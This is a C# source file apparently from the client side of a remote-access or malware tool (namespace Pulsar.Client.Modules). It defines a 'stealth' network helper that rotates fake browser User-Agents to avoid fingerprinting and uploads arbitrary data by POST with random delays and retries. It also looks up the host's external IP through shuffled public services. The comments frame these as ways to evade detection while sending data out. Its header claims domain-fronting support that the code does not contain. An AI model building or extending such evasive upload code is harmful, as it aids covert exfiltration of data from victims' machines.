using System;
using System.Net;
using System.Text;

namespace Pulsar.Client.Modules
{
    /// <summary>
    /// Stealthy Network Client
    /// Randomized User-Agent, domain fronting support, retry logic.
    /// </summary>
    public static class StealthNetwork
    {
        // Realistic User-Agents (rotated to avoid fingerprinting)
        private static readonly string[] UserAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        };

        private static readonly Random _random = new Random();

        /// <summary>
        /// Get a randomized User-Agent string.
        /// </summary>
        public static string GetRandomUserAgent()
        {
            return UserAgents[_random.Next(UserAgents.Length)];
        }

        /// <summary>
        /// Create a WebClient with stealth headers.
        /// </summary>
        public static WebClient CreateStealthClient()
        {
            var client = new WebClient();
            client.Headers[HttpRequestHeader.UserAgent] = GetRandomUserAgent();
            client.Headers[HttpRequestHeader.Accept] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            client.Headers[HttpRequestHeader.AcceptLanguage] = "en-US,en;q=0.5";
            client.Headers[HttpRequestHeader.CacheControl] = "no-cache";
            return client;
        }

        /// <summary>
        /// Upload data with retry logic and random delays.
        /// </summary>
        public static bool UploadWithRetry(string url, byte[] data, int maxRetries = 3)
        {
            for (int i = 0; i < maxRetries; i++)
            {
                try
                {
                    using (var client = CreateStealthClient())
                    {
                        // Random delay before each attempt
                        System.Threading.Thread.Sleep(_random.Next(500, 2000));
                        
                        client.UploadData(url, "POST", data);
                        return true;
                    }
                }
                catch
                {
                    // Exponential backoff
                    System.Threading.Thread.Sleep((int)Math.Pow(2, i) * 1000);
                }
            }
            return false;
        }

        /// <summary>
        /// Get external IP with retry and fallback.
        /// </summary>
        public static string GetExternalIP()
        {
            string[] ipServices = {
                "https://api.ipify.org",
                "https://ifconfig.me/ip",
                "https://checkip.amazonaws.com",
                "https://ipinfo.io/ip",
            };

            // Shuffle to avoid predictable patterns
            var shuffled = new string[ipServices.Length];
            Array.Copy(ipServices, shuffled, ipServices.Length);
            for (int i = shuffled.Length - 1; i > 0; i--)
            {
                int j = _random.Next(i + 1);
                var temp = shuffled[i];
                shuffled[i] = shuffled[j];
                shuffled[j] = temp;
            }

            foreach (var service in shuffled)
            {
                try
                {
                    using (var client = CreateStealthClient())
                    {
                        return client.DownloadString(service).Trim();
                    }
                }
                catch { }
            }

            return "Unknown";
        }
    }
}
